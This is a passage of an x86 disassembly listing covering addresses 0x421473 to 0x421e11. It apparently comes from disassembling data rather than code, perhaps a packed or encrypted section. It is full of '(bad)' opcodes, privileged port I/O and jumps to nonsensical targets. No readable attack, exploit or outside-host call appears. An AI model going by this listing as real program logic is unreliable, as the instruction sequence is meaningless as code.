  421473:	dec    ebx
  421474:	fdivr  st,st(5)
  421476:	mov    ebp,0x30930901
  42147b:	mov    bl,0x7
  42147d:	rcr    DWORD PTR [eax],1
  42147f:	mov    ebp,0xc550f154
  421484:	nop
  421485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421486:	sbb    DWORD PTR [edi+0x73],esp
  421489:	jmp    0x43322445
  42148e:	push   0xffffffa9
  421490:	es push cs
  421492:	cmp    dh,BYTE PTR [edx]
  421494:	pop    ecx
  421495:	mov    al,ds:0xd08af902
  42149a:	mov    ah,0xbc
  42149c:	add    eax,0x40f34b7a
  4214a1:	arpl   WORD PTR [eax+0x1e],bx
  4214a4:	pop    eax
  4214a5:	mov    al,ds:0x60fee11a
  4214aa:	rcl    DWORD PTR [eax-0x7b],1
  4214ad:	push   esi
  4214ae:	rol    BYTE PTR [eax-0x787d7040],cl
  4214b4:	xchg   BYTE PTR [eax],cl
  4214b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214b7:	in     al,dx
  4214b8:	mov    eax,0x2aa54628
  4214bd:	add    esi,DWORD PTR [ebx+0x78]
  4214c0:	mov    ah,BYTE PTR [edi-0x69f82dc1]
  4214c6:	xchg   ebx,eax
  4214c7:	shr    BYTE PTR [edi+0x63405283],cl
  4214cd:	popf   
  4214ce:	mov    dl,0xd5
  4214d0:	push   edi
  4214d1:	int    0xa5
  4214d3:	sbb    eax,0xf649e6fe
  4214d8:	push   ss
  4214d9:	shl    BYTE PTR [eax+0x78],1
  4214dc:	int3   
  4214dd:	jp     0x4214f4
  4214df:	push   edx
  4214e0:	push   ds
  4214e1:	sub    al,0xbb
  4214e3:	mov    dl,0x46
  4214e5:	test   al,0x72
  4214e7:	sub    BYTE PTR [esi-0x31],al
  4214ea:	hlt    
  4214eb:	sub    ebx,DWORD PTR [ebp+0x37468b72]
  4214f1:	mov    DWORD PTR [ecx+ebp*1],esi
  4214f4:	or     edi,DWORD PTR [esi-0x175f545e]
  4214fa:	sub    ecx,ecx
  4214fc:	test   DWORD PTR ds:0xae0d0f7b,edx
  421502:	ret    
  421503:	adc    DWORD PTR [edi+0x6],edi
  421506:	cmc    
  421507:	loop   0x4214f3
  421509:	xchg   edi,eax
  42150a:	cs call 0x4c4:0xfc79b2ae
  421512:	repz pop ebp
  421514:	rcr    DWORD PTR [edi],cl
  421516:	add    BYTE PTR [ecx],0xf4
  421519:	mov    ebp,0x4550f947
  42151e:	out    0xa3,al
  421520:	push   esp
  421521:	add    eax,0xfc9fc7ea
  421526:	jns    0x4214ee
  421528:	(bad)  
  421529:	push   ecx
  42152a:	pusha  
  42152b:	jle    0x4215a1
  42152d:	or     al,0x1f
  42152f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421530:	xor    DWORD PTR [edx-0x6d12efc5],edi
  421536:	fst    st(5)
  421538:	xchg   ebp,eax
  421539:	mov    ch,0x81
  42153b:	mov    dl,0x59
  42153d:	stc    
  42153e:	mov    WORD PTR [ecx],fs
  421540:	mov    dh,0x2d
  421542:	lea    edx,[ebx+0x354dd94e]
  421548:	jne    0x421559
  42154a:	dec    edi
  42154b:	stc    
  42154c:	lahf   
  42154d:	fimul  DWORD PTR [edi-0x5d5ef567]
  421553:	cmp    BYTE PTR [ebx],ah
  421555:	dec    edi
  421556:	mov    edi,0xb835b80b
  42155b:	retf   0x6642
  42155e:	js     0x421544
  421560:	cmc    
  421561:	mov    dl,0x1e
  421563:	into   
  421564:	xchg   ebx,eax
  421565:	iret   
  421566:	aam    0xe2
  421568:	lds    esi,FWORD PTR [eax]
  42156a:	inc    ebp
  42156b:	aaa    
  42156c:	jno    0x42150c
  42156e:	jnp    0x421559
  421570:	fwait
  421571:	mov    dh,0x12
  421573:	mov    ds:0xb28d09b6,al
  421578:	push   es
  421579:	sar    BYTE PTR [eax-0x44],0x9
  42157d:	in     al,0x51
  42157f:	test   al,0x7
  421581:	aam    0x2b
  421583:	cmp    ch,ch
  421585:	popf   
  421586:	sbb    DWORD PTR [eax-0x2039768d],eax
  42158c:	(bad)  [ebx+0x47]
  42158f:	stos   BYTE PTR es:[edi],al
  421590:	imul   edi,DWORD PTR [edx+0x191ab248],0x34
  421597:	cld    
  421598:	aad    0xfe
  42159a:	pop    esi
  42159b:	retf   0x8023
  42159e:	lea    esp,[edi+0x7d]
  4215a1:	scas   eax,DWORD PTR es:[edi]
  4215a2:	cli    
  4215a3:	xchg   DWORD PTR [ecx],edi
  4215a5:	cmp    cl,0x83
  4215a8:	sub    BYTE PTR [eax+edx*2-0x2c52d547],0xe8
  4215b0:	dec    ebp
  4215b1:	jb     0x421608
  4215b3:	popa   
  4215b4:	icebp  
  4215b5:	sar    BYTE PTR [ebx],1
  4215b7:	repnz (bad) 
  4215b9:	out    0xad,al
  4215bb:	mov    ds:0x4a327a72,eax
  4215c0:	cmp    eax,0x4919e873
  4215c5:	xchg   edx,eax
  4215c6:	rol    ch,0x25
  4215c9:	sbb    BYTE PTR [edi+ebx*4],dh
  4215cc:	das    
  4215cd:	in     al,0x7f
  4215cf:	push   edx
  4215d0:	and    esi,esi
  4215d2:	push   0xb5109226
  4215d7:	(bad)  
  4215d8:	sub    DWORD PTR [eax-0x5f2e5ae8],eax
  4215de:	or     al,0xd9
  4215e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215e1:	cmp    eax,0x588c9225
  4215e6:	nop
  4215e7:	sti    
  4215e8:	sti    
  4215e9:	sub    eax,0x7f82d0b2
  4215ee:	add    eax,0xfc70dc6b
  4215f3:	jl     0x421590
  4215f5:	mov    ds:0x643c0db7,al
  4215fa:	(bad)  [ebx]
  4215fc:	mov    eax,ds:0xa047ecac
  421601:	and    al,0x57
  421603:	push   edi
  421604:	and    al,0x1e
  421606:	(bad)  
  421607:	jmp    FWORD PTR [eax-0x2c]
  42160a:	jo     0x42160d
  42160c:	mov    esi,0xd684a8e3
  421611:	cmp    BYTE PTR [ebx],dl
  421613:	dec    edx
  421614:	xchg   edx,eax
  421615:	cld    
  421616:	jne    0x4215bd
  421618:	dec    eax
  421619:	push   esi
  42161a:	xchg   ebp,eax
  42161b:	retf   0x4926
  42161e:	(bad)  
  42161f:	imul   esi
  421621:	cmp    al,0x36
  421623:	les    eax,FWORD PTR ds:0x722e8929
  421629:	lock cmp ch,ah
  42162c:	dec    esi
  42162d:	retf   
  42162e:	cmp    al,0x3f
  421631:	aaa    
  421632:	out    dx,eax
  421633:	adc    eax,0xe9ddf449
  421638:	push   0xffffff98
  42163a:	leave  
  42163b:	pop    es
  42163c:	ss (bad) 
  42163e:	arpl   WORD PTR [ecx],bp
  421640:	push   cs
  421641:	pop    ds
  421642:	sub    eax,0x501b7cae
  421647:	ror    DWORD PTR [edx],0x95
  42164a:	adc    DWORD PTR [edx],ebp
  42164c:	pop    esi
  42164d:	mov    DWORD PTR [ecx],0x988fad9a
  421653:	xor    BYTE PTR [ebp+0xd8ce43a],ch
  421659:	push   ecx
  42165a:	jl     0x421628
  42165c:	jle    0x42161d
  42165e:	popf   
  42165f:	sub    al,0x40
  421661:	push   ss
  421662:	mov    esi,0x50b384e6
  421667:	mov    ah,0xa3
  421669:	call   0xf2f521df
  42166e:	xchg   ebx,eax
  42166f:	enter  0x49f5,0x79
  421673:	sub    cl,ah
  421675:	loop   0x421646
  421677:	jge    0x42167f
  421679:	pusha  
  42167a:	xchg   ebp,eax
  42167b:	push   edi
  42167c:	adc    BYTE PTR [eax],bl
  42167e:	dec    edx
  42167f:	imul   edi,ecx,0xf07f2044
  421685:	std    
  421686:	repz (bad) 
  421688:	mov    dh,0xea
  42168a:	pop    eax
  42168b:	int    0x9b
  42168d:	cmp    al,0xb7
  42168f:	sbb    esi,edx
  421691:	jae    0x4216d8
  421693:	xor    cl,BYTE PTR [esi-0x14]
  421696:	loope  0x421703
  421698:	inc    ebp
  421699:	pop    ebx
  42169a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42169b:	es xchg edi,eax
  42169d:	stos   BYTE PTR es:[edi],al
  42169e:	or     al,0xe6
  4216a0:	fidivr WORD PTR [edx]
  4216a2:	adc    edx,DWORD PTR [ecx+0x6e]
  4216a5:	popf   
  4216a6:	jge    0x4216d6
  4216a8:	push   ebp
  4216a9:	cmp    eax,0x57ec5499
  4216ae:	inc    ebp
  4216af:	(bad)  
  4216b0:	ja     0x42170a
  4216b2:	ret    0xdf65
  4216b5:	xchg   ecx,eax
  4216b6:	daa    
  4216b7:	test   al,0x57
  4216b9:	inc    esp
  4216ba:	fistp  QWORD PTR [esp+eax*2]
  4216bd:	ret    0x720e
  4216c0:	xlat   BYTE PTR ds:[ebx]
  4216c1:	(bad)  
  4216c2:	push   esp
  4216c3:	loopne 0x42172b
  4216c5:	fnstsw ax
  4216c7:	pop    ds
  4216c8:	push   esp
  4216c9:	je     0x4216ae
  4216cb:	(bad)  
  4216cc:	in     al,0xf4
  4216ce:	enter  0x796d,0xed
  4216d2:	ret    
  4216d3:	sbb    ah,dh
  4216d5:	lahf   
  4216d6:	mov    ds:0xa3b348a2,eax
  4216db:	or     eax,0xc3150f9f
  4216e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216e1:	call   0x6e1:0x55434207
  4216e8:	or     al,0x4
  4216ea:	and    esi,DWORD PTR [esi]
  4216ec:	xor    eax,0xf482db26
  4216f1:	xor    eax,0xf8ecd8fc
  4216f6:	int    0xea
  4216f8:	dec    edx
  4216f9:	pop    ebx
  4216fa:	out    0x30,eax
  4216fc:	sub    eax,DWORD PTR [edi]
  4216fe:	outs   dx,BYTE PTR ds:[esi]
  4216ff:	or     ebp,DWORD PTR cs:[ebx]
  421702:	xchg   bl,bh
  421704:	lahf   
  421705:	psrld  mm3,QWORD PTR [eax+0xb]
  421709:	repz arpl si,dx
  42170c:	mov    edi,DWORD PTR [ecx+0x52]
  42170f:	arpl   sp,ax
  421711:	or     ch,ch
  421713:	sbb    eax,ecx
  421715:	(bad)  
  421716:	call   0xa8f967d9
  42171b:	mov    ch,0xae
  42171d:	jmp    0x90a5:0x8ec61d4c
  421724:	push   edi
  421725:	in     al,dx
  421726:	stc    
  421727:	add    ebx,DWORD PTR [ecx+esi*1+0x78]
  42172b:	mov    esi,0xa0ac7acb
  421730:	hlt    
  421731:	sbb    DWORD PTR ds:0x35c5a5a9,edx
  421737:	xor    ecx,DWORD PTR [esi]
  421739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42173a:	dec    ebp
  42173b:	mov    si,0xbc28
  42173f:	dec    esp
  421740:	push   es
  421741:	adc    DWORD PTR [ecx+esi*2],0xb240703
  421748:	icebp  
  421749:	js     0x42170b
  42174b:	mov    al,0x5c
  42174d:	cmp    al,0x0
  42174f:	repz adc al,0x34
  421752:	lock mov ds:0x31bc318f,al
  421758:	xor    BYTE PTR ds:0xac72e4db,0x8f
  42175f:	test   DWORD PTR [eax+0x61f9525c],eax
  421765:	adc    esp,esp
  421767:	cmp    DWORD PTR [esi+0x4c],eax
  42176a:	xchg   BYTE PTR [ebp+0x7d4374d8],bh
  421770:	push   0xff90506d
  421775:	clc    
  421776:	or     eax,0x85394500
  42177b:	jle    0x42170f
  42177d:	out    0x95,eax
  42177f:	gs out 0x88,al
  421782:	not    DWORD PTR [edi-0x1ddd414a]
  421788:	inc    ebx
  421789:	int3   
  42178a:	idiv   DWORD PTR ds:[esi-0x3e88470a]
  421791:	xor    al,0x9b
  421793:	and    DWORD PTR cs:[ecx],esi
  421796:	loope  0x4217bb
  421798:	(bad)  
  421799:	lods   eax,DWORD PTR ds:[esi]
  42179a:	pop    esp
  42179b:	xchg   ebx,eax
  42179c:	into   
  42179d:	pop    ecx
  42179f:	push   eax
  4217a1:	mov    BYTE PTR [esp+ebp*2-0x5c521a01],bl
  4217a8:	jg     0x421754
  4217aa:	cmp    edi,ebx
  4217ac:	stos   BYTE PTR es:[edi],al
  4217ad:	cld    
  4217ae:	stc    
  4217af:	adc    DWORD PTR [esi+0x323cdde9],edi
  4217b5:	(bad)  
  4217b6:	add    bl,BYTE PTR ss:[eax]
  4217b9:	push   ss
  4217ba:	mov    ah,0x15
  4217bc:	xor    ah,al
	...
  42198e:	shr    ah,cl
  421990:	and    edx,DWORD PTR [ecx]
  421992:	aas    
  421993:	fcomip st,st(2)
  421995:	out    dx,eax
  421996:	or     DWORD PTR [esi+0x2eaceacd],ebp
  42199c:	shl    BYTE PTR [eax+0x1cce3],1
  4219a2:	and    al,BYTE PTR [edi]
  4219a4:	add    BYTE PTR [eax],al
  4219a6:	bound  ebx,QWORD PTR [edx]
  4219a8:	loop   0x421951
  4219aa:	adc    cl,BYTE PTR [ecx-0x5ad5acfe]
  4219b0:	sub    eax,0x997e8fe7
  4219b5:	jae    0x4219d1
  4219b7:	or     esi,DWORD PTR [ecx-0x67]
  4219ba:	ror    DWORD PTR [edi+esi*4+0x3],cl
  4219be:	xchg   edx,eax
  4219bf:	retf   0x6c2a
  4219c2:	bnd jnp 0x4219b2
  4219c5:	cmp    BYTE PTR [ebp-0x3ff3c25b],ah
  4219cb:	sbb    eax,ecx
  4219cd:	shr    DWORD PTR [ecx-0x47],1
  4219d0:	(bad)  
  4219d1:	sbb    eax,0x18e07fb3
  4219d6:	sti    
  4219d7:	fiadd  DWORD PTR [ebp+eiz*1-0xe640926]
  4219de:	cmp    bl,BYTE PTR [ebp*1+0x3f2d0d75]
  4219e5:	xor    eax,0x47262d37
  4219ea:	mov    ebx,0x84e2ce94
  4219ef:	or     bl,al
  4219f1:	mov    bh,0xb5
  4219f3:	loop   0x421a2c
  4219f5:	add    edx,ecx
  4219f7:	cdq    
  4219f8:	into   
  4219f9:	xchg   ebp,eax
  4219fa:	adc    dl,BYTE PTR [esi+0x11]
  4219fd:	mov    BYTE PTR [ecx],cl
  4219ff:	xor    dl,al
  421a01:	mov    WORD PTR [ebx+0x5b816c42],ds
  421a07:	mov    cl,0xce
  421a09:	cmp    esi,ebp
  421a0b:	mov    ch,0x1a
  421a0d:	add    ebx,ebx
  421a0f:	push   DWORD PTR [edi-0x50ba2ca5]
  421a15:	jae    0x4219ef
  421a17:	out    0x50,al
  421a19:	mov    ebx,DWORD PTR [ebx-0x7a]
  421a1c:	hlt    
  421a1d:	push   ds
  421a1e:	les    ecx,FWORD PTR [esi]
  421a20:	fwait
  421a21:	iret   
  421a22:	stos   BYTE PTR es:[edi],al
  421a23:	mov    cl,0x71
  421a25:	dec    BYTE PTR [eax-0x191e446e]
  421a2b:	fist   WORD PTR [eax+0x7615fc05]
  421a31:	mov    DWORD PTR [ebx+0x41],esi
  421a34:	icebp  
  421a35:	fimul  DWORD PTR [edx]
  421a37:	(bad)  
  421a38:	call   0x5737b992
  421a3d:	prefetch BYTE PTR [ebp+0x5049e1da]
  421a44:	cli    
  421a45:	hlt    
  421a46:	imul   ebx,DWORD PTR [edx-0x5046be7e],0x3125f696
  421a50:	pop    esp
  421a51:	jno    0x421a01
  421a53:	sub    eax,0xb7c13d73
  421a58:	sub    esi,DWORD PTR [eax+ebp*1-0x21df99c4]
  421a5f:	adc    BYTE PTR ds:[ebp+0x2d07168d],0x73
  421a67:	add    bh,BYTE PTR gs:[ebx]
  421a6a:	pop    edx
  421a6b:	sar    ch,1
  421a6d:	push   ecx
  421a6e:	mov    ebx,0x675a8626
  421a73:	jecxz  0x421a67
  421a75:	push   ds
  421a76:	fidivr WORD PTR [ecx-0x3d]
  421a79:	jnp    0x421a38
  421a7b:	or     al,0x3
  421a7d:	fwait
  421a7e:	sub    bh,ch
  421a80:	bound  ebx,QWORD PTR [edi+ecx*1-0x72aa5b37]
  421a87:	push   ebp
  421a88:	mov    esp,0x60605c99
  421a8d:	(bad)  
  421a8e:	out    dx,al
  421a8f:	mov    ebx,0x6aae6075
  421a94:	mov    bh,BYTE PTR [ebp+eax*4+0x50]
  421a98:	push   esp
  421a99:	jmp    0x421b18
  421a9b:	es dec edi
  421a9d:	pusha  
  421a9e:	add    dl,BYTE PTR [esp+edx*8+0x40a83a08]
  421aa5:	mov    cl,0x41
  421aa7:	(bad)  
  421aa9:	and    eax,0x11a46783
  421aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aaf:	mov    ecx,0x12e282b9
  421ab4:	mov    eax,ds:0xa37aaaf
  421ab9:	mov    DWORD PTR [edi-0x27fa2030],ebp
  421abf:	je     0x421a6e
  421ac1:	popa   
  421ac2:	hlt    
  421ac3:	and    ebp,0xe00a2a1e
  421ac9:	(bad)  
  421aca:	or     dh,BYTE PTR [ecx-0x26]
  421acd:	imul   esp,DWORD PTR [edx+0x1d],0x4eb6fc95
  421ad4:	inc    ecx
  421ad5:	outs   dx,DWORD PTR ds:[esi]
  421ad6:	cmp    esi,DWORD PTR [ecx]
  421ad8:	es rcr dl,cl
  421adb:	out    dx,eax
  421adc:	scas   eax,DWORD PTR es:[edi]
  421add:	mov    edx,0x3025340d
  421ae2:	ret    
  421ae3:	addr16 out 0x2d,eax
  421ae6:	mov    ebp,esi
  421ae8:	mov    ch,0x99
  421aea:	mov    eax,ds:0xe81a8e7a
  421aef:	cmc    
  421af0:	cmc    
  421af1:	rcr    BYTE PTR [ecx+0x185ecc68],1
  421af7:	xor    al,0x73
  421af9:	mov    bh,0x57
  421afb:	addr16 xchg ebp,eax
  421afd:	sbb    DWORD PTR ss:[ebx+0x5b06ab4a],esi
  421b04:	retf   0xf21e
  421b07:	(bad)  
  421b08:	outs   dx,DWORD PTR ds:[esi]
  421b09:	push   ebx
  421b0a:	push   edx
  421b0b:	rol    dl,cl
  421b0d:	mov    dh,0x41
  421b0f:	mov    ecx,0xadb4299e
  421b14:	popa   
  421b15:	sbb    eax,0xddbeede7
  421b1a:	sbb    DWORD PTR [ebx-0x54250bfb],ecx
  421b20:	sub    al,0x87
  421b22:	mov    BYTE PTR [ecx+0x19],bh
  421b25:	arpl   si,si
  421b27:	xchg   edx,eax
  421b28:	dec    ecx
  421b29:	retf   
  421b2a:	data16 shr ah,0x75
  421b2e:	lods   eax,DWORD PTR ds:[esi]
  421b2f:	adc    al,0x17
  421b31:	in     al,0x8d
  421b33:	cmc    
  421b34:	not    DWORD PTR [ecx+edx*4+0x29de3f0e]
  421b3b:	lahf   
  421b3c:	and    al,0x6a
  421b3e:	shl    BYTE PTR ss:[eax-0x485ccbac],1
  421b45:	and    eax,0xd133f99e
  421b4a:	outs   dx,BYTE PTR ds:[esi]
  421b4b:	lods   eax,DWORD PTR ds:[esi]
  421b4c:	mov    BYTE PTR [edi],bl
  421b4e:	add    esi,eax
  421b50:	cmp    DWORD PTR [ebx+ebx*2],ebp
  421b53:	jnp    0x421b7e
  421b55:	push   ss
  421b56:	rol    DWORD PTR [ebx+edi*4+0x8],0x3f
  421b5b:	repz jno 0x421b60
  421b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b5f:	leave  
  421b60:	cmp    al,0x17
  421b62:	arpl   WORD PTR [ebx+0xf73461f],dx
  421b68:	sub    eax,0xe6a78485
  421b6d:	jae    0x421b9d
  421b6f:	test   BYTE PTR [ebx+0x11],dh
  421b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b73:	(bad)  [ecx]
  421b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b76:	xor    BYTE PTR [esi+0x42],0xba
  421b7a:	pop    ecx
  421b7b:	(bad)  
  421b7c:	sub    esi,DWORD PTR [ecx]
  421b7e:	gs sahf 
  421b80:	jmp    0xc7c11012
  421b85:	test   esp,esi
  421b87:	(bad)  
  421b88:	cld    
  421b89:	in     eax,0x6e
  421b8b:	not    BYTE PTR [eax+0xd]
  421b8e:	xchg   esi,eax
  421b8f:	xchg   ebp,eax
  421b90:	cmp    BYTE PTR [eax],cl
  421b92:	fs jbe 0x421bbf
  421b95:	fldcw  WORD PTR [esi+edx*8-0x3121286d]
  421b9c:	sub    al,0x68
  421b9e:	xor    DWORD PTR [ecx-0x1f62c535],ecx
  421ba4:	add    DWORD PTR ds:0x918de8a6,edx
  421baa:	jle    0x421b67
  421bac:	cmp    ebx,DWORD PTR [ebp-0x679f2dd0]
  421bb2:	ret    
  421bb3:	mov    ch,0x25
  421bb5:	pop    edi
  421bb6:	add    eax,0xd74b59d6
  421bbb:	push   esi
  421bbc:	fdiv   st(1),st
  421bbe:	ret    
  421bbf:	hlt    
  421bc0:	jg     0x421bf2
  421bc2:	and    ah,BYTE PTR [ecx-0x7d]
  421bc5:	mov    edi,0x79d4427f
  421bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bcb:	scas   eax,DWORD PTR es:[edi]
  421bcc:	in     al,0xaf
  421bce:	dec    ebp
  421bcf:	push   cs
  421bd0:	push   0x4b
  421bd2:	ret    0x9ef9
  421bd5:	dec    esi
  421bd6:	js     0x421be5
  421bd8:	retf   
  421bd9:	stos   DWORD PTR es:[edi],eax
  421bda:	int    0xa4
  421bdc:	enter  0x2349,0x16
  421be0:	push   0xc78183e4
  421be5:	out    dx,eax
  421be6:	lea    ebx,[ebx-0x65e69ec3]
  421bec:	pop    edx
  421bed:	into   
  421bee:	xchg   ecx,eax
  421bef:	and    ch,bh
  421bf1:	pop    esi
  421bf2:	mov    eax,ds:0x9c4c041a
  421bf7:	jae    0x421c2e
  421bf9:	xchg   ebp,eax
  421bfa:	inc    ebx
  421bfb:	ret    
  421bfc:	sbb    DWORD PTR [edx],esp
  421bfe:	pusha  
  421bff:	enter  0xfa14,0x22
  421c03:	xchg   edi,ebx
  421c05:	pop    ebp
  421c06:	xor    bl,BYTE PTR [edi-0xc]
  421c09:	popf   
  421c0a:	xlat   BYTE PTR ds:[ebx]
  421c0b:	movq   mm5,QWORD PTR ds:0x6c1438d2
  421c12:	call   0x2297:0xfaadb9fe
  421c19:	out    0x62,al
  421c1b:	out    dx,eax
  421c1c:	adc    BYTE PTR ds:0x41708c51,ch
  421c22:	jns    0x421c6b
  421c24:	pop    ebx
  421c25:	leave  
  421c26:	pop    edi
  421c27:	sbb    eax,0xc2095c6a
  421c2c:	hlt    
  421c2d:	in     eax,0x51
  421c2f:	jne    0x421bdf
  421c31:	sbb    al,0xce
  421c33:	jo     0x421bbe
  421c35:	ret    
  421c36:	fisub  WORD PTR [esi]
  421c38:	mov    ch,0x49
  421c3a:	int3   
  421c3b:	test   al,0x7c
  421c3d:	data16 data16 (bad) 
  421c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c41:	bound  ebp,QWORD PTR [ebp+0x7a]
  421c44:	dec    eax
  421c45:	scas   eax,DWORD PTR es:[edi]
  421c46:	mov    ebp,0xba736826
  421c4b:	pop    ebx
  421c4c:	sar    DWORD PTR [eax+0x6e],cl
  421c4f:	pop    ecx
  421c50:	sbb    BYTE PTR [eax+0x5e8dd659],ch
  421c56:	xor    eax,0x15f79b4a
  421c5b:	dec    ebp
  421c5c:	popf   
  421c5d:	mov    WORD PTR [ecx+0x2a],cs
  421c60:	(bad)  
  421c61:	dec    esi
  421c62:	and    eax,0x7c2791ad
  421c67:	addr16 adc ebp,edx
  421c6a:	dec    esi
  421c6b:	imul   eax,DWORD PTR [edx+0x42ebb1be],0xd50c87ad
  421c75:	jp     0x421c47
  421c77:	daa    
  421c78:	outs   dx,BYTE PTR ds:[esi]
  421c79:	mov    ds:0x3d5cddb5,eax
  421c7e:	or     DWORD PTR cs:[ecx+0x192d9402],edx
  421c85:	(bad)  
  421c86:	data16 ds aad 0xe3
  421c8a:	loope  0x421c40
  421c8c:	retf   0x3953
  421c8f:	ins    DWORD PTR es:[edi],dx
  421c90:	xchg   ebp,eax
  421c91:	add    DWORD PTR [edx],ecx
  421c93:	mov    ch,0xb6
  421c95:	push   ds
  421c96:	rcr    DWORD PTR [edi+0x56554f94],1
  421c9c:	aaa    
  421c9d:	cdq    
  421c9e:	jp     0x421caa
  421ca0:	xchg   BYTE PTR [edi],bh
  421ca2:	mov    ebp,0x64f5d701
  421ca7:	or     eax,0x95d3328f
  421cac:	mov    cl,dl
  421cae:	lds    eax,FWORD PTR [ebx-0x4b]
  421cb1:	cmp    BYTE PTR [edi-0x7ebef519],0x4b
  421cb8:	jmp    0x421d28
  421cba:	out    0xd2,al
  421cbc:	and    al,0xde
  421cbe:	xchg   ebx,eax
  421cbf:	out    0x6f,al
  421cc1:	scas   eax,DWORD PTR es:[edi]
  421cc2:	fild   WORD PTR [ebx-0x21]
  421cc5:	lods   eax,DWORD PTR ds:[esi]
  421cc6:	lock rol DWORD PTR [eax+0x17],cl
  421cca:	mov    ch,0xf2
  421ccc:	retf   
  421ccd:	xor    eax,0x4305afb7
  421cd2:	or     BYTE PTR [eax],dl
  421cd4:	cli    
  421cd5:	mov    DWORD PTR [esi-0x44],ecx
  421cd8:	jb     0x421c99
  421cda:	adc    BYTE PTR [ecx-0x7928f95f],ah
  421ce0:	aam    0x7
  421ce2:	xchg   esi,eax
  421ce3:	mov    ebp,0x93ae6020
  421ce8:	arpl   cx,bx
  421cea:	dec    edx
  421ceb:	jnp    0x421d62
  421ced:	(bad)  
  421cee:	aad    0x49
  421cf0:	dec    ecx
  421cf1:	cwde   
  421cf2:	push   esp
  421cf3:	lds    edx,FWORD PTR [edx+0x68]
  421cf6:	sbb    al,0xa
  421cf8:	jecxz  0x421c96
  421cfa:	loop   0x421cad
  421cfc:	mov    al,0x4b
  421cfe:	mov    bh,0x39
  421d00:	dec    eax
  421d01:	mov    bh,dh
  421d03:	adc    al,0xb1
  421d05:	sub    al,0x2c
  421d07:	adc    WORD PTR [bp-0x7e],di
  421d0c:	ret    0xfecf
  421d0f:	jbe    0x421d07
  421d11:	xchg   edi,eax
  421d12:	xor    DWORD PTR [ecx],esp
  421d14:	jmp    0x421d74
  421d16:	scas   eax,DWORD PTR es:[edi]
  421d17:	out    dx,al
  421d18:	test   DWORD PTR [ecx+edx*8],0x2a8e3e21
  421d1f:	mov    ch,0xc5
  421d21:	ins    BYTE PTR es:[edi],dx
  421d22:	pop    esi
  421d23:	and    al,0xbd
  421d25:	pop    ebp
  421d26:	add    ecx,DWORD PTR [esi]
  421d28:	rcr    BYTE PTR [edi+0x1c],1
  421d2b:	and    BYTE PTR [edi],cl
  421d2d:	mov    esp,DWORD PTR [ebx]
  421d2f:	push   eax
  421d30:	lahf   
  421d31:	adc    al,0x9b
  421d33:	jns    0x421d4d
  421d35:	push   edx
  421d36:	jl     0x421d41
  421d38:	into   
  421d39:	push   esi
  421d3a:	ins    DWORD PTR es:[edi],dx
  421d3b:	sub    edx,DWORD PTR [edx+0x29]
  421d3e:	xchg   edi,eax
  421d3f:	add    esi,DWORD PTR [ecx-0x6a71ce1e]
  421d45:	imul   ecx,DWORD PTR ds:0x5162da2e,0xfffffffa
  421d4c:	and    al,0xd4
  421d4e:	sbb    al,0xa6
  421d50:	push   ebx
  421d51:	inc    esi
  421d52:	fwait
  421d53:	sti    
  421d54:	inc    eax
  421d55:	jbe    0x421d85
  421d57:	jle    0x421ce8
  421d59:	fbstp  TBYTE PTR [esi-0x76c0ffc6]
  421d5f:	les    edi,FWORD PTR [ebx+0x1f]
  421d62:	repz mov ebp,0x946737a8
  421d68:	jb     0x421d3d
  421d6a:	jo     0x421d5e
  421d6c:	sbb    eax,0xa924b0c5
  421d71:	imul   ebx,edx,0x32809dec
  421d77:	inc    edi
  421d78:	ja     0x421d39
  421d7a:	mov    ebp,0x1a21e5a3
  421d7f:	sub    eax,0xbf0ef7fb
  421d84:	dec    edi
  421d85:	inc    DWORD PTR [ebp+0x165ee811]
  421d8b:	push   ecx
  421d8c:	out    0x31,al
  421d8e:	mov    bl,0xdd
  421d90:	shl    DWORD PTR cs:[edx+0x8],1
  421d94:	pop    es
  421d95:	sbb    edx,DWORD PTR [eax]
  421d97:	push   edi
  421d98:	retf   0xced6
  421d9b:	sti    
  421d9c:	fmul   DWORD PTR [edx-0x1]
  421d9f:	pop    esi
  421da0:	iret   
  421da1:	pop    esi
  421da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421da3:	imul   esp,DWORD PTR [edx+0x5b],0x2e
  421da7:	jbe    0x421de5
  421da9:	(bad)  
  421dab:	dec    ebx
  421dac:	sti    
  421dad:	repnz (bad) 
  421daf:	push   0xd6fb0682
  421db4:	xchg   BYTE PTR [edx+0x79544614],bh
  421dba:	cld    
  421dbb:	xchg   DWORD PTR [ecx],ebx
  421dbd:	(bad)  
  421dbe:	mov    dl,0x62
  421dc0:	dec    esi
  421dc1:	and    BYTE PTR [edi+0x63e073fd],bh
  421dc7:	push   0xffffffd3
  421dc9:	push   0x1c
  421dcb:	and    esp,DWORD PTR [edx-0x1e1e94d9]
  421dd1:	adc    BYTE PTR [ebp+0x30],bl
  421dd4:	push   edx
  421dd5:	or     ebx,edi
  421dd7:	fbstp  TBYTE PTR [edx-0x14464ed5]
  421ddd:	outs   dx,DWORD PTR ds:[esi]
  421dde:	sub    DWORD PTR [ebx-0x41e42b5b],0x65813915
  421de8:	dec    eax
  421de9:	cvttps2pi mm4,QWORD PTR [ecx+0x2d]
  421ded:	push   ecx
  421dee:	inc    eax
  421def:	mov    esi,0x6af55993
  421df4:	iret   
  421df5:	add    al,0x39
  421df7:	cvtps2pi mm1,QWORD PTR [edx+0xc4cd61d]
  421dfe:	cli    
  421dff:	daa    
  421e00:	jge    0x421e25
  421e02:	pop    es
  421e03:	push   es
  421e04:	rol    bl,cl
  421e06:	push   esi
  421e07:	lock lods al,BYTE PTR ds:[esi]
  421e09:	mov    esi,ebx
  421e0b:	fmul   QWORD PTR ds:[ebp+0x6e]
  421e0f:	int    0xb6
  421e11:	jmp    0x71c6c12c
